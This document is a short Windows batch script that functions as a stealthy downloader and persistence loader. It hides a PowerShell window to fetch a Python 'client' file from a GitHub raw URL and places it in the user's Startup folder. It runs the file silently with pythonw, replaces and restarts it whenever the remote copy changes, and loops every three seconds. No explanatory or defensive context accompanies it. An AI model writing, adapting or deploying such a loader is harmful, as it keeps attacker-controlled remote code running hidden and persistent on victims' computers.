@echo off
setlocal enabledelayedexpansion
set "url=https://raw.githubusercontent.com/sky9262/abc/refs/heads/main/client.py"
set "target=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\client.pyw"
set "temp=%TEMP%\client_new.pyw"
:loop
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%temp%'">nul 2>&1
if exist "%target%" (
fc /b "%temp%" "%target%">nul 2>&1
if errorlevel 1 (
taskkill /f /im python.exe /fi "WINDOWTITLE eq client.pyw*">nul 2>&1
taskkill /f /im pythonw.exe /fi "WINDOWTITLE eq client.pyw*">nul 2>&1
copy "%temp%" "%target%">nul 2>&1
start /b pythonw "%target%">nul 2>&1
) else (
tasklist /fi "IMAGENAME eq pythonw.exe" /fi "WINDOWTITLE eq client.pyw*" 2>nul | find /i "pythonw.exe">nul || start /b pythonw "%target%">nul 2>&1
)
) else (
copy "%temp%" "%target%">nul 2>&1
start /b pythonw "%target%">nul 2>&1
)
del "%temp%">nul 2>&1
timeout /t 3 /nobreak>nul 2>&1
goto loop
